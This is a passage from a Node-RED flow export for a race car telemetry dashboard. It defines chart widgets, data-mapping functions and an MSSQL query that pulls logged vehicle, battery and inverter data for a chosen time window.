        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "a495d3909dedb2c3",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Commanded Torque",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1280,
        "y": 620,
        "wires": [
            []
        ]
    },
    {
        "id": "b1f884da881c8fc2",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\nlet series5 = msg.payload.map(item => item.brake_pressure_front);\nlet series6 = msg.payload.map(item => item.brake_pressure_rear);\nlet series7 = msg.payload.map(item => item.steering_angle);\nlet series8 = msg.payload.map(item => item.vehicle_speed);\nlet series9 = msg.payload.map(item => item.high_temp);\nlet series10 = msg.payload.map(item => item.low_temp);\nlet series11 = msg.payload.map(item => item.pack_open_voltage);\nlet series12 = msg.payload.map(item => item.pack_amp_hours);\nlet series13 = msg.payload.map(item => item.inv_motor_speed);\nlet series14 = msg.payload.map(item => item.inv_motor_temperature);\nlet series15 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series16 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series17 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series18 = msg.payload.map(item => item.brake_temperature_rear_right);\nlet series19 = msg.payload.map(item => item.inv_torque_feedback);\nlet series20 = msg.payload.map(item => item.inv_commanded_torque);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\", \"Brake Pressure Front\", \"Brake Pressure Rear\", \"Steering Angle\", \"Vehicle Speed\", \"High Temperature\", \"Low Temperature\", \"Pack Open Voltage\", \"Pack Amphours\", \"Motor Speed\", \"Motor Temperature\", \"Brake Temperature Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\", \"Torque Feedback\", \"Commanded Torque\"],\n        \"data\": [series1, series2, series3, series4, series5, series6, series7, series8, series9, series10, series11, series12, series13, series14, series15, series16, series17, series18, series19, series20],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 680,
        "wires": [
            [
                "eaaff7d74f7a7e52"
            ]
        ]
    },
    {
        "id": "eaaff7d74f7a7e52",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "group": "138120695bcd6cbc",
        "order": 7,
        "width": "30",
        "height": "14",
        "label": "All Vars",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "90f0eb2c4e1b1de5",
        "type": "MSSQL",
        "z": "a5a35a884df38a1a",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 740,
        "y": 220,
        "wires": [
            [
                "3f77ee8a1510677f",
                "354b6bbdf930116d",
                "c1dbb1ec98c57aba",
                "5d12423eb237299d",
                "5e1e1ac619816c05",
                "7346961e9bc86d1b",
                "629f06c4e2507c71",
                "d3b3112a27dec1a5",
                "51528fa94f8bc774",
                "639f7b8a0640fe69",
                "150676ae27de9713",
                "d0954a33c4746f3c",
                "259fc783c92c7936",
                "b5b24d160b2a085e",
                "3118857487301cfe",
                "7f504d5c515686cb",
                "6ac0390839e64a7c",
                "a57cf2d67b576307",
                "6ee6fbe0faa559f8"
            ]
        ]
    },
    {
        "id": "107e61d82c73e1c1",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 560,
        "y": 220,
        "wires": [
            [
                "9f940de87cced2c6",
                "90f0eb2c4e1b1de5"
            ]
        ]
    },
    {
        "id": "9f940de87cced2c6",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 660,
        "y": 120,
        "wires": []
    },
    {
        "id": "8dea4ad7a9fb0cd5",
        "type": "ui_text_input",
        "z": "a5a35a884df38a1a",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "37fa01b38570666f",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 160,
        "y": 200,
        "wires": [
            [
                "2d7ae46e37749455",
                "4fe51564a57fadc6"
            ]
        ]
    },
    {
        "id": "314c2540a5fc8d19",
        "type": "ui_slider",
        "z": "a5a35a884df38a1a",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "37fa01b38570666f",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 170,
        "y": 240,
        "wires": [
            [
                "2d7ae46e37749455",
                "c1c9b5fa63dd2aa0"
            ]
        ]
    },
    {
        "id": "2d7ae46e37749455",
        "type": "join",
        "z": "a5a35a884df38a1a",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 350,
        "y": 220,
        "wires": [
            [
                "107e61d82c73e1c1",
                "3432d802fd06c02a"
            ]
        ]
    },
    {
        "id": "4fe51564a57fadc6",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 140,
        "wires": []
    },
    {
        "id": "c1c9b5fa63dd2aa0",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "group": "37fa01b38570666f",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 320,
        "y": 300,
        "wires": []
    },
    {
        "id": "3432d802fd06c02a",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 260,
        "wires": []
    },
    {
        "id": "6606b0ddb159879f",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 11,
        "width": "10",
        "height": 6,
        "label": "Reference Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "3bce2f5f5926f774",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 15,
        "width": "10",
        "height": 6,
        "label": "Iq and Id Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "2325192d4672564c",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 12,
        "width": "10",
        "height": 6,
        "label": "Feedforward Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "14aca8d8ad10e004",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 13,
        "width": "10",
        "height": 6,
        "label": "Voltage Between Phases",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "b91347274bee8f32",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "Voltages (Other)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "28a8f2d45c80f20e",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 14,
        "width": "10",
        "height": "6",
        "label": "Currents (Others)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "4bac67e9bc436452",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 20,
        "width": "10",
        "height": 6,
        "label": "Phase Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "e12348898725e889",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1350,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "26803a8b2ad138aa",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 9,
        "width": "10",
        "height": "6",
        "label": "Motor Angle (Electrical)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "cee58944ef8ded67",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "60546afd373bb3e0",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "RTD Input Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "a87287b63d7a56dc",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Board Temeperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "f532b429468ce19f",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Module Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "763a6ba5998417a2",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 16,
        "width": "10",
        "height": "6",
        "label": "Diagnostic Phase Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1400,
        "y": 700,
        "wires": [
            []
        ]
    },
    {
        "id": "64212f27e7ed2872",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 18,
        "width": "10",
        "height": "6",
        "label": "Command Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "a239299933bef655",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 17,
        "width": "10",
        "height": "6",
        "label": "Command Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 820,
        "wires": [
            []
        ]
    },
    {
        "id": "5fd4ae9fbd270645",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 21,
        "width": "10",
        "height": "6",
        "label": "PWM Frequency",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 860,
        "wires": [
            []
        ]
    },
    {
        "id": "8d79420c84062d6b",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 19,
        "width": "10",
        "height": "6",
        "label": "Max BMS Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 940,
        "wires": [
            []
        ]
    },
    {
        "id": "73d0aa067a7b1026",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Torques",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 900,
        "wires": [
            []
        ]
    },
    {
        "id": "3f77ee8a1510677f",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_output_voltage);\nlet series2 = msg.payload.map(item => item.inv_dc_bus_voltage);\nlet series3 = msg.payload.map(item => item.inv_fast_dc_bus_voltage);\nlet series4 = msg.payload.map(item => item.inv_stall_burst_model_temperature);\nlet series5 = msg.payload.map(item => item.inv_diag_vdc);\nlet series6 = msg.payload.map(item => item.inv_diag_vqs_cmd);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Output Voltage\", \"INV DC Bus Voltage\", \"INV Fast DC Bus Voltage\", \"INV Stall Burst Model Temperature\",\"INV Diag Vdc\",\"INV Diag Vqs CMD\"],\n        \"data\": [series1, series2, series3, series4. series5, series6],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 220,
        "wires": [
            [
                "b91347274bee8f32"
            ]
        ]
    },
    {
        "id": "354b6bbdf930116d",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_dc_bus_current);\nlet series2 = msg.payload.map(item => item.inv_diag_fw_output);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV DC Bus Current\", \"INV Diag FW Output\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 260,
        "wires": [
            [
                "28a8f2d45c80f20e"
            ]
        ]
    },
    {
        "id": "c1dbb1ec98c57aba",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_phase_a_current);\nlet series2 = msg.payload.map(item => item.inv_phase_b_current);\nlet series3 = msg.payload.map(item => item.inv_phase_c_current);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Phase A Current\", \"INV Phase B Current\", \"INV Phase C Current\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 340,
        "wires": [
            [
                "4bac67e9bc436452"
            ]
        ]
    },
    {
        "id": "5d12423eb237299d",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
